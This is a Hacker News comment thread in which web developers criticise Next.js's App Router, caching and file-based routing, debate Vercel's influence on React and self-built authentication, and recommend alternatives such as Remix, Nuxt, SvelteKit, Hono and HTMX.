    "commentBody": "It's not just you, Next.js is getting harder to use (propelauth.com)133 points by carlual 11 hours agohidepastfavorite140 comments afloatboat 7 hours agoWe just turned back from Nextjs after a 4 month trial for a new application. Some issues we ran into: - The dev environment is too finicky. Full page reloads instead of HMR and random errors after x reloads. - Cache is a black hole and works differently between dev and production. They’re changing things up now with v15, but this lack of stability is not fun to rely on. - The file based router has its limitations. For instance: having the language in the URL means your entire tree remounts when the language is changed. - No clear way to bootstrap specific stuff outside of React - Portals don’t seem to work on the server. - very easy to mess up auth stuff. At some point Supabase even put out a YT video [0] where their implementation caused auth to be accidentally cached. There are 3 levels of checks you need to do just to be safe, but this is all very opaque. For me it also wasn’t clear how to combine client and server state. These patterns haven’t been defined yet and I kept running into hydration issues with no clear solution. A year after the app router the eco system still feels very much in limbo and brittle. I also worked with Next as a replacement for Gatsby’s SSR, but quickly discovered that there’s no easy way for Next to just pre generate all responsive image sizes it needs for a static output like Gatsby has. You need to implement a custom loader and rely on something like cloudinary. This is ridiculous for a completely static site. [0] https://youtu.be/v6UvgfSIjQ0 reply PaulHoule 6 hours agoparent- very easy to mess up auth stuff. At some point Supabase even put out a YT video [0] where their implementation caused auth to be accidentally cached. There are 3 levels of checks you need to do just to be safe, but this is all very opaque. Auth is all you need. It is a non-functional requirement in that your site is non-functional if auth is broken. In the large it is Yahoo or Google or Facebook buying a site and hooking it up into their entire service but in the small it is \"I want an email newsletter script\" and instead of messing around with HMR and file-based routing and other inessentials to develop my own, I just pick a best-of-breed application and hook it up to my user database and auth system and I am in business. (Today, without a clean API, I can hack that application to query my user database and be behind my auth module if the tech stack is sufficiently similar to my own at risk of braving whatever inessentials that route entails) reply malfist 6 hours agorootparentRolling your own auth is like the first big no no in application security. Unless you're an expert, leave it to the experts reply PaulHoule 6 hours agorootparentExactly. It is not the implementation of the auth module that matters to me so much as is the API through which it slots into the rest of the system. I want the expert designed modules that I can plug various systems into. Because we haven’t seen good frameworks at the user management level, I think, the mistakes made by the creators of that YT video are common in the industry. reply zer00eyz 6 hours agorootparentprevThe fuck are you talking about. Auth is the most basic of things you should be doing yourself. Im sorry but encryption isn't that hard. Login isn't that hard. Session management isn't that hard. Google/fb Logins are harder... but tying your USER relationship to platforms with NO CUSTOMER SUPPORT is probably a dumb idea. Security is best understood when practiced and monitored and watched by everyone in the organization. Security is NOT some boggy man that you claim is too hard and farm out to someone else. The only reason that you MIGHT want to farm out login, is if you want to shift liability to someone else ... reply throwAGIway 5 hours agorootparentNot implementing auth doesn't mean using platforms. Just use any of the many OIDC client/server libraries or completely pre-made open source dockerized services. For example react-oidc-context on the client side and Passport.js on the server, or Casdoor. reply darby_nine 5 hours agorootparentIt only takes your auth provider going down once to abandon this idea entirely, both as a user and a consumer. Edit: dockerized services sound interesting, do you have an example? reply onion2k 5 hours agorootparentprevIm sorry but encryption isn't that hard. Login isn't that hard. Session management isn't that hard. Verifying you haven't broken any of these things is hard, and monitoring for breaches when you have a lot of legitimate users is very hard. reply zer00eyz 5 hours agorootparentVerifying that your vendor hasn't done anything dumb is hard. Supporting your customers when they have problems is hard. Debugging issues with a thrird party in the loop is hard. Just because you farmed out auth doesn't mean you get to stop monitoring for breaches, or doing all the other things you need to do to have an eye on security. Farming out auth just ads a recurring cost per user and complexity that your going to ignore till its a bigger issue than dealing with this up front would have ever been. reply darby_nine 5 hours agorootparentprevAbsolutely disagree. You shouldn't roll your own bcrypt, but you should have full knowledge of how it's used to offer authentication. Hell this is required to even move forward with sales in many enterprise software contexts. If you don't know how passwords work, for the love of god don't offer password-based login. reply sandreas 7 hours agoparentprevTry hono.js ;) https://hono.dev/ reply hamasho 5 hours agorootparentYet another JS framework, and it looks great. I've only skimmed the doc, but I already like its simplicity. But I have a mixed opinion on the big Context object. It may help to write less verbose code, but it can also cause OOP's antipattern God Object[1], even though the context is more of a namespace rather than a big object. // Not app.get('/hello', (c) => { return c.json({ greet: `Hello ${c.req.params('id')}`) // But import { jsonResponse } from 'library' app.get('/hello', (req) => { return jsonResponse({ greet: `Hello ${req.params('id')}`) [1] https://www.wikiwand.com/en/God_object Fix: format reply bentonnn 2 hours agorootparentHono is great, the context object is really just a collection of helper methods for returning responses, a way to store values through the lifetime of the request, and the Req and Res objects. I understand the concern but I wouldn't let that stop you from trying it out. reply sandreas 4 hours agorootparentprevI was not totally serious about it. My hunt for the next best framework is over... I tend to use vanilla JS for my pet projects and for more serious stuff I use whatever I find interesting or what the project uses :-) reply NayamAmarshe 8 hours agoprevWhen I first discovered Next.js, it was like finding a gold-mine. I no longer had to use an express server and couple that with React and manage all the crazy configs. Next.js was so simple, everything just worked! The docs were absolutely amazing, dev server was super fast, the build times were fast, I could easily create server side and static sites, host them on Vercel easily, good times all around. Then came the Vercel + React partnership and it took things in a different direction. Now React almost became a child of Vercel. All of a sudden, the focus instantly shifted to server side from what was earlier client side & server side both. Breaking changes, added complexity and the strange co-existence of 2 routers, out of which the old one (which works perfectly fine btw) is certainly set to become obsolete in the near future leaving us with no choice but to move to this 'new' router. Next.js app router is extremely slow. You don't even need to do anything special, just compare the dev server compile times of Next.js v12 vs v14, the performance has decreased. The dev server sometimes occupies gigabytes of memory, why? Can I also mention the 'new' but worse file-based routing system that forces every page to be named page.tsx? Who thought that was a good idea? They simply copied Sveltekit. This even forced the VSCode team to introduce a way to edit the tab names because every page being called page.tsx is undoubtedly worse DX! All good things come to an end, and I certainly feel this way now with Next.js. I was a proponent, I recommended it to everybody who was looking to build apps with React but now? I'm not so sure anymore, considering how confused they are about their own decisions (refer to the v14's caching controversy). I'll be jumping ship to a better product as soon as I find one (and I'm sure there will be in the future). For now, I'm just sticking because of the years of familiarity with React.js and Next.js. They have served me well but Next.js has simply become Outdated.js as far as the future is concerned. reply tommy_axle 7 hours agoparentNext.js jumped the shark with the app router. The page router, though it wasn't perfect, was a nice fit and was an extension of the React way (at the time) by handling the client-side well. You got routing and some ability to execute certain things on the server-side plus basic api support. For everything else you could use a full express backend or even other backend languages/stacks. But like with many things, simplicity could not be appreciated and now you have this mess. It's time for a better alternative. reply _andrei_ 7 hours agoparentprevBeen working with React for the past 9 years and I hate what Vercel's influence has done to it. I hate what they've done to Next as well, but at least that one is theirs. reply delduca 5 hours agorootparentI have the same feeling, Vercel is destroying React. reply the_mitsuhiko 5 hours agoparentprev> The dev server sometimes occupies gigabytes of memory, why? My strong suspicion is async locals. I found some references to next related async locals hanging on timers recently: https://lucumr.pocoo.org/2024/6/5/node-timeout/ reply Aeolun 7 hours agoparentprevThere’s https://vike.dev/ though that still feels a bit rough to me compared to Next. reply rgbrgb 5 hours agorootparentThis looks nice, first time I’m seeing it. Just curious, what feels rough? reply Aeolun 2 hours agorootparentJust the way everything hangs together. It works, but some things are in the code, but not the docs, mentioned on the site, but the init tool they refer has no facility for it, so you need to connect it yourself. reply makerdiety 7 hours agoparentprevWhat was wrong with Express.js? No, what is wrong with it right now? Because all I see is Next.js just being a wrapper for what Express.js does. Also, Next.js is becoming like Angular: The progress from Angular.js 1 to Angular 18 was necessary for solving the problem of very hard front-end web development. So I'm guessing this Next.js contender is trying to become the Angular of the back-end. They're basically turning into the theoretical computer science constructs that they must become. Script kiddies and non-computer science students need not apply. reply 9dev 7 hours agorootparentBuilding a product on Express is like making a sandwich by growing wheat and raising cattle. Sure Next is a wrapper around Express; JavaScript is a wrapper around assembly. Yet some people don’t have time to do everything from scratch again and just want a sensible framework to build upon. reply williamcotton 7 hours agorootparentExpress is like making a sandwich by buying bread, meat, and condiments from the super market. NextJS is like buying a sandwich from a vending machine. The biggest issue with apps like NextJS is that they didn't explicitly build upon and expose the Express API. What they should have done is client-side app routing with a version of Express that runs route handlers in the browser. They also needed to add parallel middleware that runs in both a browser and server context. That's the only sane way to support functionality and components that run in both the server and browser context. The entire NextJS architecture is flawed because they picked the wrong pivot point. We want to be making sandwiches from store-bought components. Sometimes we do need to swap out the bread and NextJS has the wrong abstractions to do so which results in all sorts of soon-to-be-breaking-changes-spaghetti to work-around the deficiencies. It would have been much better to maintain an application by working directly with requests, request middleware and request route handlers, with a mock request corresponding to mouse events for the client-side. The request-response cycle is the fundamental nature of the web application, even in the browser. reply makerdiety 7 hours agorootparentprevDue to economies of scale, the massive manufacturing of your theoretical sandwiches with your own wheat and cattle agriculture should be cheaper in the end on a large scale (compared to the present alternative). And at that large scale it is the only effective and practical choice. So, we can infer the general conclusion that there are multiple and different types of software development with the existence of things like Express.js and Next.js. Namely real developers and lowly developers like cows on a factory line. reply wruza 5 hours agorootparentprevThis comparison is unreasonably disproportional. reply NayamAmarshe 7 hours agorootparentprev> What was wrong with Express.js? Setting it up was a hassle and so was hosting it. It's a great tool, don't get me wrong but after using Next.js, I never needed it. There's also Hono (https://hono.dev) now, which is like Express.js but better. reply thr0w 6 hours agorootparent> Setting it up was a hassle and so was hosting it. How is it possible that there are people active in this industry who think setting up Express is a hassle? reply 52-6F-62 5 hours agorootparentThey got promoted to senior+ and run the show. “Greybeards go home, the future is now”? reply wruza 5 hours agorootparentprevHow does one set up express and host a web server correctly? >hono Seems absolutely the same to me, their getting started shows no login mw (only already token-ed auth), and it’s just a single context param instead of (req, res, next, res.{text,json}). What’s so innovative there? Feels like yet another cute solution looking for a problem. reply makerdiety 7 hours agorootparentprevYou know what, I thought Next.js was a backend framework. I must be thinking of something else. I mistakenly have confused one thing with another. So never mind lol reply moogly 7 hours agorootparentYou might be thinking of Nest.js. reply jstummbillig 7 hours agorootparentprevSomething something Dropbox reply makerdiety 7 hours agorootparentThat Dropbox thing is just a meme which I don't understand. I'm not \"in\" on the joke, if you will. I don't see how the Dropbox meme is relevant here. reply jstummbillig 7 hours agorootparenthttps://news.ycombinator.com/item?id=9224 A part of HN history, if you will, making light fun of the \"it's just a wrapper\" idea that transitions into a multi billion dollar company, because only naively is execution and the integration of different ideas a trivial task. The people at NextJS are obviously(?) doing something that's not just Express and you can look at the version history if you are interested in identifying those things. Of course, you might not think of them as important. But that's a very different take. reply jc_811 5 hours agoparentprevJoin us on the Vue side! Using Vue and Nuxt (if you need SSR) has been an absolute joy to work with in my experience reply NayamAmarshe 1 hour agorootparentI've always admired Nuxt because it's always been the one to introduce amazing features that Next has always copied but I never gave it a try. Maybe it's time. reply quietdev 2 hours agorootparentprevI want to like Vue but the combination of buggy language tools and a buggy metaframework left a bad taste in my mouth. It's not surprising either when you look at the code quality. reply nextaccountic 8 hours agoparentprevWhat about SvelteKit? reply NayamAmarshe 7 hours agorootparentI'm not a fan of Svelte's cryptic syntax and constant changes. They started with something simple, which is why I decided to build upscayl.org's simple website with SvelteKit but now it's simply too much of a hassle when I compare it with Next.js. They changed their whole state management system. It's like using a totally new framework now and it looks very much like React which is strange because Svelte was supposed to not be like React and offer simplicity in code. I think the best contender right now Solid.js but it needs some financial help and the fanciness of Next.js to attract a larger developer base. reply 9dev 7 hours agorootparentI share your frustration around the constantly high amount of changes in fundamental concepts, but overall I still feel like SvelteKit gets lots of things right that Next doesn’t. reply NayamAmarshe 7 hours agorootparentI think SolidStart framework brings Svelte's and React's strong points together very well. I'm really interested in how it grows, I can say that it has a brighter future than Next or Sveltekit. reply doctor_eval 7 hours agorootparentprevAre you talking about svelte 5? (Serious question) reply NayamAmarshe 1 hour agorootparentYes, the one with runes. reply quietdev 2 hours agorootparentprevSvelte is a ton of magic, which is great if you like that sort of thing but every time I've tried it I've been frustrated and disappointed, and converted the project to something else. reply joeatwork 8 hours agoprevSoftware tools backed by businesses that target enterprises have very strong pressures towards obscurity, complexity, and generally optimizing for institutional goals and away from development experience and effectiveness. As tools that get developer adoption move up market they get worse and worse for the folks building with them. reply smolder 7 hours agoparentThis is a good reminder of how thankful we should be for the many contributors to Free software. reply jampekka 7 hours agoparentprevHere we also have the ensittification on top, as Vercel starts to squeeze out platform profits. reply szundi 8 hours agoparentprevI wonder wether it is possible to keep on the right (dev) track? One could argue that when becomes shit, sooner or later it is going to be abandoned at the end reply carlual 11 hours agoprevIt feels like the entire JavaScript world seems overly influenced by e-commerce, pushing all kinds of optimization, even including RSC and SSR. As a former SaaS builder, I deeply resonate with the author's point: \"I care way more about the speed at which I ship features, and all that complexity becomes a burden on my dev team.\" This is exactly why I started building ZenStack(https://zenstack.dev) toolkit. The goal is to brings simplicity back to building SaaS applications, using whatever framework you like. reply jampekka 7 hours agoparentSome feedback on the page: I found the intro blurb[1] a bit off-putting with all the corporatese. Namely \"supercharging to unlock potential\" gives an instant BS vibe. Don't know how it looks like for other audiences, but I'd guess e.g. HN audience on average do not like it. Just use the space to say what it actually is and does? It's definitely not the worst offender, and that's probably why I wanted to give the feedback. [1] \"A TypeScript toolkit that supercharges Prisma ORM with a fine-grained Authorization layer, auto-generated type-safe APIs/hooks to unlock its full potential for full-stack development.\" reply carlual 3 hours agorootparentThank you for the kind and thoughtful feedback! The change has been made. reply jampekka 2 hours agorootparentVery good now, thanks! reply Tade0 8 hours agoparentprevThat's just the React world which, granted, is the majority of the JavaScript world. Over here in Angular land not much has been happening. Ok, we have signals now, but that's about it. If you want simplicity, use htmx and your backend framework of choice. reply spoiler 7 hours agorootparentMy 2c on the whole React and complexity situation: it's not great, but at the same time it's not as bad as someone people make it sound. Things _can_ be done in a simple way. The issue with React is that it's just a library, and there's some gaps it leaves that companies like Vercel tried to fill (and abused, but that's another topic). So then you get a bunch of new-ish developers who haven't even properly learned react throwing in a bunch of random libraries they also don't fully understand how to use, and you end up with a shit soup. Not because the ingredients are bad, but simply because the cook didn't know how to use them. I've seen people abuse React. I've seen people abuse Redux (and extensions). Even with there being ample resources for both. People want to try to be creative withou planning ahead, and then things happen and the business wants to go on, but devs are rarely given time to integrate and apply stuff they learned from previous mistakes, etc. So while some of the problems are technological in nature, I think the biggest problem is not the technology itself, but how it's combined with inexperienced developers With that said, I'm also a big fan of designing APIs that are easy to use, and difficult to misuse. React has areas of the API which fail on both of those principles though (I hink some of which they want to address with the React Compiler) reply graypegg 8 hours agorootparentprevI was building a big monolith angular (v8 at the time) app a few years ago and I think my old coworkers from that job would get a laugh from hearing me reminisce about it! Angular is actually very nicely laid out as a front end framework. I’m finding the modern react ecosystem more obtuse than old angular apps. reply politelemon 7 hours agorootparentprev>×Over here in Angular land not much has been happening. Ok, we have signals now, but that's about it. I'd put its quietness (relative quietness and least) forward as one of its redeeming features and an example of its stability. reply Tade0 6 hours agorootparentI joke that this is the framework of choice for people with children. You can be out of the workforce for a year and still everything is mostly the same when you come back. Also it keeps all the thrill chasers out, which is very helpful in delivering things on time and within budget. Of course it would be better if we had some creature comforts like fast compilation times and good performance by default, but not at the cost of introducing the sort of chaos the React people live and breathe. reply beretguy 9 hours agoparentprevAh! Another js framework that will fix problems of all the previous ones… great… reply 000ooo000 8 hours agorootparentRelax. No-one is taking your precious jQuery from you. reply jampekka 7 hours agorootparentjQuery isn't a framework. As a library it's still precious. reply 000ooo000 4 hours agorootparentI don't think that distinction is key to the insinuation reply jampekka 57 minutes agorootparentI got the tribal insinuation. reply rc_mob 7 hours agorootparentprevphew! perfect reply zelphirkalt 8 hours agorootparentprevI mean, the potential always exist, but I would rather avoid much JS at all and only use a minimal amount of it, which is usually not what JS frameworks intend to let you do. reply zer00eyz 6 hours agorootparentprevHow dare you look down your nose at the techonolgical magpies. They do love to collect shiny things! reply yodon 6 hours agoprevGenuine question: what's wrong with a client-side SPA and a server-side backend for 90% of small-to-midsized SaaS apps? I see why Vercel would want everyone using SSR and their opaque server-side caching, but why do generic non-FAANG-scale web apps want it on day one? When Next became a Vercel sales tool, I switched to React + Vite + backend, and everything just got so much easier. reply throwitaway1123 2 hours agoparentFrontend devs were largely bullied into imitating traditional MPAs by people posting memes about SPAs and loading spinners. A huge percentage of pages could simply be pre-rendered (e.g. static landing pages and documentation sites), or they're behind a login wall in which case SEO no longer really matters. Deploying an SPA used to mean uploading a few scripts and html documents to an S3 bucket, and with CDN caching it was fast enough for many organizations. Instagram is still a mostly 100% client side SPA. reply nojvek 1 hour agorootparentI’m probably going to die on the hill of building either: 1. SPA with html css and a bunch of js hosted on cdn, talking to pure REST api. (For apps behind login) 2. Php style Server rendered pages with a sprinkle of inline jquery-ish JS. (For websites) Hybrid of both of them is a Frankenstein monster I ain’t touching. reply mattrighetti 5 hours agoparentprev> what's wrong with a client-side SPA and a server-side backend for 90% of small-to-midsized SaaS apps? I'm not a frontend dev and what I like about SSR is that you don't have to code frontend visual effects that indicate that \"something is loading\", you just get the hydrated page back without too much frontend logic. reply yodon 5 hours agorootparentThat's a lot of complexity to bring in just to avoid adding atag reply whalesalad 5 hours agoparentprevIf SEO is not important there is nothing wrong with this approach. reply bluefirebrand 5 hours agorootparentStop building products that get their income from advertising and SEO worries go away in a hurry It's actually wonderful reply rgbrgb 4 hours agorootparentIt’s not about ads, it’s about distribution. If people find your product via google then SEO matters (at least for the page they land on). reply bluefirebrand 4 hours agorootparentYour marketing website should be SEO'd up the wazoo It also shouldn't be part of your product codebase. You should not need to worry about SEO in your product itself reply quietdev 2 hours agorootparentIt's crazy how people want to combine everything together such that adding some padding to a button on their pricing page redeploys their entire backend... Typically I have a backend server written in a good language, an SPA for the app itself, and then some marketing pages written in plain html and js sprinkles, old school. It's great for SEO. reply moogly 6 hours agoprevUseless anecdote: I don't have direct experience with Next.js[1] (but React, Angular, Vue, Solid), but I did help a co-worker out with something in their Next.js app, and as soon as I saw the madness that was file-based routing I wrote off the whole thing. [1]: mostly because I have never been interested in the modern form of SSR due to my controversial belief that that is a truly _insane_ solution to SEO, TTFB and page load performance. You don't really solve a problem by piling more problems on top, however many billion man-hours a whole industry spends on that endeavor. reply wdb 6 hours agoparentFile-based routing is one of the best things to have up to particular size of an application. Makes navigating the code so much easier then routing spread throughout the code base reply bryanrasmussen 5 hours agorootparentIf you have a single routes source that makes it just as easy, although that really depends on the people making sensible route handlers for the routes to point to, if people are not good at doing that obviously the implicit order of /pages is superior. reply bluefirebrand 5 hours agorootparentprevYou shouldn't need to structure the codebase based on how the application is routed More importantly you shouldn't need to restructure the codebase if the application routing changes File based routing is a terrible idea reply moogly 2 hours agorootparentMy exact visceral reaction. reply epolanski 6 hours agoparentprevI don't think file based routing is the evil, on Nuxt it works very well. reply martinald 6 hours agoprevI've done an enormous amount of web performance analysis work, and as soon as I see the nextjs bundle come down in the network tools I know there will be issues. It just seems exceptionally slow to another stack I've seen. Whether this is poor docs or bad implementations, I'm not entirely sure, but it seems there is a major issue with it - I do not see in my analysis any other stack having anywhere the amount of issues that nextjs does. The main problems I find are exceptionally poor TTFB on their server side rendering. This then pushes people to do aggressive caching of various types (without often fully understanding the ramifications of cache management) - which improves things, until a user is eg logged in then you're back to square one a lot of the time. The second problem is slow hydration times, regardless of SSR/caching. This causes major waterfall problems for interactivity as the nextjs bundle still needs to hydrate before most (any?) interactivity is possible. While all SPA-esque frameworks suffer with this kind of stuff, nextjs just seems to take it to the next level and it often does not seem trivial to fix when I report the issues. reply ThalesX 7 hours agoprevI used Next.JS awhile ago and it was great. Then I switched to Remix and it was great. Then I went back to Next.JS and I couldn't understand where things went wrong. From the routing model to the deployment model, it all felt so broken that I couldn't convince myself to continue using it. reply fullstackchris 7 hours agoparentWould you currently recommend Remix over Next.JS? I just started a Next.JS project (trying it as a long time Gatsby user) but am worried about what I am reading here. reply NayamAmarshe 7 hours agorootparentMoving from Gatsby to Next's pages router is definitely an upgrade. Pages router is awesome and easy to understand. reply etimberg 6 hours agorootparentprevI would; it's a lot easier to use and reason about. that being said, it feels like we've come full circle back to the early 00s with form posts for submitting changes rather than fetch/xhr reply hamasho 5 hours agoprevDo people use Next.js as an API server too? In all the projects I've joined, we've only used Next.js as a static frontend framework and dev tool built on top of React. We never touched the SSR feature, just used it as a static site generator, and didn't bother implementing any APIs in Next.js. I can't imagine someone can implement a robust code base while mixing frontend and backend code in that messy folder structure. reply PUSH_AX 7 hours agoprevI started a project with next about 2.5 years ago. That version is pretty good, easy to reason about. A year or so back I spun up a new next project only to be greeted with very unintuitive errors regarding trying to use client libraries in server pages? Something like that. I wondered if I was going crazy or if this was actually going in a terrible direction. reply lioeters 5 hours agoparentI have a couple of fairly large Next.js projects, started a few years ago. One of them I was able successfully upgrade to the latest major version of Next, after going through a number of errors, deprecations, and studying the documentation. There are so many little details and rules to remember now, just like React. It's an accumulation of seemingly user-hostile design decisions for not much apparent benefit from the user's perspective. The second project is stuck with a cryptic error that prevents the production build step from completing, and after searching through GitHub issues and even going into the Next.js codebase, I'm unable to fix it. At this point, I've given up on the upgrade and searching for a different framework to rebuild the app on. It's hundreds of pages, many of them generated by dynamic URL routes, so I'm not looking forward to it. It's a huge effort just to get the application to work exactly as it did before. The upgrade experience has soured me on Next.js, I wouldn't start a new project with it. Even React I'm getting doubtful of its recent direction, and eyeing other view libraries that achieve the simplicity it used to have. reply jddj 6 hours agoparentprevI haven't touched Next, but the discussions and issues of some things I do use seem littered with people thinking they're on the client when they're on the server and vice versa. Someone upthread said there were some common Auth footguns and I'm not surprised at all. Maybe the warnings are to try to mitigate that. reply sarreph 8 hours agoprevAll this negative sentiment around the App Router like in this post made me really scared to adopt it. I've just been working with it for the past 2 months and absolutely love it. The biggest reason being the ability call functions directly from server- or client-side code! You basically only need to write API endpoints now for externally-facing services. Saves so much time and boilerplate... Yes it is more complex than Pages Router. And while I'm a staunch advocate for simplicity where possible, I do think the tradeoff is worth it for new projects. It just takes a bit getting used to. The negativity feels a bit like hooks all over again tbh... reply brtkdotse 5 hours agoprevAs someone who got started with web dev by sending HTML over HTTP I marvel about the ways modern web devs contort themselves to be able to send json instead. reply mattrighetti 5 hours agoprevI am not a frontend dev, but I've been using NextJS for the last 6 months to build a website and I've been using the App Router because I wanted to have SSR and because NextJS suggests to go with that. I'm feeling good with it at the moment, even though I'm trying to keep things as simple as possible so you might argue that I'm not really pushing it to the limits. The major \"issue\" I'm having is mixing server and client components as I inevitably tend to overcomplicate stuff: if I need any kind of client interaction then I have to mark is with `use client`, but then everything you place in that component also becomes a client component. If you want to keep server components in a client component you have to pass it through the use of {children} prop which sometimes is not ideal. reply atlex2 5 hours agoprevAs a person who got back into web dev and tried Next for the first time, I was pretty upset once I learned that I was using this half baked App router rather than the more straightforward page router. Their FAQ literally asks if their are any open source applications built on app router: https://nextjs.org/docs/app#are-there-any-comprehensive-open... reply atlex2 5 hours agoparentOh, and not to mention that because of Vercel ownership, Next/Image will never support Google App Engine and specifying the image cache directory in an environment variable or at compile time. reply renegade-otter 7 hours agoprevMy observation as a [mostly] backend dev is that the JS world in general is fascinated with building complexity and then using more complexity to address the previous complexity. Transpilers, converters, tree-shakers, oh my. It's 2024 - building a web app should not be rocket science or require such obscene tool chains. Unrelated, but I've been trying to finish a project of mine, and after long breaks I would discover that my front-end code was out of date. There was already a better framework, or a new version, making your old code obsolete. I gave up after Vue 3 introduced composition API - all I did was learn \"the new ways\" without actually building anything. Then I switched to HTMX and ditched all that bullshit. reply Zanfa 7 hours agoparentMy pet theory is that due to zero interest rate policy, too many startups were able to raise too much money and so they hired too many engineers that didn’t have anything really productive to do for years. So they kept reinventing wheels for a decade plus, each iteration more complex than the previous one. reply renegade-otter 6 hours agorootparentThis is what I believe, and it's one of the bigger points I made when I wrote Death By a Thousand Microservices: https://renegadeotter.com/2023/09/10/death-by-a-thousand-mic... It's related, I think. In a truly lean business environment, people would not have so much time mucking around with these frameworks. It actually looks like developers come up with zingy library and framework names and THEN they actually write them. reply Quothling 6 hours agoparentprevHTMX with GoLang is such a relief compared to working with anything else in web-related apps. We're still doing a monorepo with NextJs some NX (which is frankly also rather unnecessary since everything it does can be done fairly simply with pnpm workspaces and vite), a complicated storybook setup and 9 billion libraries for components, utilities and what not. We're also still trundling along with C# even though it's 2024 and functions should be capable of living outside of classes in any language... Naturally build on \"clean architecture\" and \"solid\" which makes the entire code base a ginormous mess of unnecessary abstractions where a simple helper which does one single thing and is never re-implemented lives in 9 billion files in several different csproj's because it \"might\" need to be abstracted one day (it won't). It takes me longer to figure out where things are in those projects than it does to develop an entire internal service with HTMX and Go... Which despite being a huge success for everyone, and hailed by the business itself has made no impact on our future plans. We can sit in a meeting where everyone has achieved something marvelous with HTMX and Go and still decide to keep using NextJS and C#. It's silly, but I've never really worked for a company where it wasn't this stupid and at least we're not so trapped by ourselves that we can't build things with \"non strategic\" tools. reply neonsunset 5 hours agorootparentIf you think that Go is a better choice than C#, you probably spend too much time watching tech influencers on youtube and twitch and too little time programming and getting familiar with the technologies they spread FUD about. Go is inferior to C# in every possible dimension: performance, package management, terseness and expressiveness - Go brings notoriously more boilerplate, Go has poorer ecosystem for writing web applications, worse ORMs and worse tools for troubleshooting advanced issues in production - the list goes on. There are companies that do C# disservice, but you're going to hate to see what they will do with Go instead. reply Quothling 2 hours agorootparentI'm not sure how you feel I attacked C# aside from thinking it had the unnecessary bloat of requiring functions to live in class objects. As far as splitting everything up into 9 billion files and projects it's not something C# really forces you to do. I don't mind dotnet too much, I've worked with it for a decade and it's never been as great to work with as what it's become. I'd never pick it over Go for a new project if I had the choice though. I'm genuinely curious as to why you'd say these things however: > Go has poorer ecosystem for writing web applications For me personally the std http handlers is by far the best experience I've ever had with web development. Though I suspect that you may have worked with Go before the std was enough, and if so your experience was probably a little \"tainted\" by how the the ecosystem can be a little too \"node\" like. > worse ORMs and worse tools for troubleshooting advanced issues in production Now this is personal preference but I don't particularly like the rich debugging capabilities of the Microsoft package for C#. Exactly because it's hard to use them in production. Which depends on what sort of production environment you have, but we rely on open telemetry even for our dotnet applications. As far as ORMs go... We operate at a scale where they aren't useable. Entity Framework is quite nice... It's just that the industry has sort of moved beyond the need for ORMs. Even if your teams manage to avoid the lazy loading pitfalls your ORM is eventually going to be more complex than simply working without one. Partly because they weren't really designed for things like an Expand Contract Pattern (which you can implement, but then you're doing more work than simply writing raw SQL), but mainly because LLM's have made it sooooo easy to be both productive and remain control over your data. > Go brings notoriously more boilerplate I can write a struct and a function and then call it on my type in less lines of code than it takes to do the whole namespace... So I'm really not sure what you mean by this. If it's the C# magic which happens behind the scenes I think it's up to your personal opinion whether or not you want the control. As you might have guess from my take on ORM's I prefer the transparency and control. reply spirobelv2 5 hours agoprevI am building an alternative to nextjs that consists of just 3 files and has no external dependencies. https://github.com/spirobel/mininext (my goal with mininext is to provide index.php like productivity but with all of npm and typescript at your fingertips) reply eknkc 7 hours agoprevI think it makes a lot of sense for Vercel to push RSC and all the complexity of new Next. - They sell compute / bandwidth. You can not make a lot of money if people are building SPAs that load from a CDN and execute on client. - SSR kind of gives them some server compute but as soon as the initial page is loaded, we are back to point 1. - Here comes RSC then. And they pushed hard. Made it look like the best thing ever. Oh the initial load time is the most important metric. You gotta make sure you hit this score on whatever benchmark thing… - They also kind of acquired React. It is basically Vercel’s now so they can dictate the development direction. - All this with almost no benefit to developers (compared to something like pre app dir next) but likely helps them a lot in terms of revenue. I mean this might read like “vercel evil” post but it is what corps do and they seem to do it well. I used next on a project recently and will not touch it again because the hype did not materialize as any type of gains during our own development. reply spoiler 7 hours agoprevI'll never get over how convoluted it felt to make a modal appear on the screen, using the \"blessed\" Next.js way. You need parallel routes, slots, intercepting routes, file names that look like the blast radius of a shell script gone wrong with names containing (..)s, [slugs], and @slots, and special-purpose file names like page.ts, index.ts, default.ts, some stuff auto-magically passed in as props. It's like they're trying to take ideas from something like Rails without having ever even used Rails, and then pervert those ideas. I know I sound overly critical perhaps, and maybe I'm being too harsh, but it just feels like there's this bizarre appreciation or worship of arcane complexity by Next devs. And any simplicity and straightforward-ness is shunned and frowned upon. Like simplicity is somehow beneath them, and simplicity is only for stupid plebs like myself. I haven't used Remix, but their docs suggest it's simpler. reply synergy20 5 hours agoprevI avoid all SSR with node.js these days, not that they're bad, but: 1. it's a mature field with many solutions already, no need reinvent the wheel for me. 2. the frontend is complex enough reply aosaigh 7 hours agoprevI'm still using the pages router due to complexity of the app router. At this point, I think that I'll move to another framework instead of moving to the app router. They completely botched the transition from pages to app router and even now, literally years later, there are still simple things you can't do with the app router. It's also just hugely confusing defaulting to server components. It's a shame because in the beginning, Next.js was a breath of fresh air. reply dcchambers 4 hours agoprevI think Vercel has a good product and clearly very talented engineers working there, but their takeover of the React ecosystem has been alarming. A well executed embrace-extend-extinguish playbook to get people using the Vercel platform. reply ncrmro 6 hours agoprevThe hardest think now is forgetting all the patterns we used on client side only say. On successful form submet change the ui based on this error state. Now because of server actions you would just redirect to a success page.. It’s actually way simpler. It harks back to full SSR like Django/Rails/Wordpress reply rickcarlino 8 hours agoprevI’m curious about alternatives that offer good file-based routing support. Has anyone seen any good alternatives? reply rickcarlino 5 hours agoparentMentioned so far: - Deno Fresh: https://fresh.deno.dev/ - Astro: https://docs.astro.build/en/guides/routing/ - Remix: https://remix.run/docs/en/main/file-conventions/routes - Nuxt: https://nuxt.com/docs/getting-started/routing#pages - SvelteKit: https://kit.svelte.dev/docs/routing reply chuckadams 6 hours agoparentprevNuxt just works out of the box. It can get as complex as Next, but (most of) the footguns aren't loaded, cocked, and aimed already like everything in the React world seems to be (skip the component auto-imports tho, that one will bite you eventually) . Been using it to build a completely static SPA for years now, and it never makes a peep about server-side logic when working in that mode. Suspense just works, happening automatically when you have an async component, without any extra ceremony needed on your end. And yes, it has a pretty nice file router built in, and useRoute() works everywhere. If file routing is all you want though, then skip Nuxt and use vite-plugin-pages (which also works with React). reply keb_ 7 hours agoparentprevSvelteKit is nice, but also consider Deno Fresh. reply Zealotux 8 hours agoparentprevRemix is better in every aspect. reply Aeolun 7 hours agorootparentI really don’t like how remix stuffs their philosophy down your throat. Old next at least was more free form. reply zelphirkalt 8 hours agoparentprevQuite easy to implement oneself, I would say. reply ivanjermakov 8 hours agorootparentLiterally. My experience with routing tools is that it's often easier to implement it from scratch perfectly suited for your use case instead 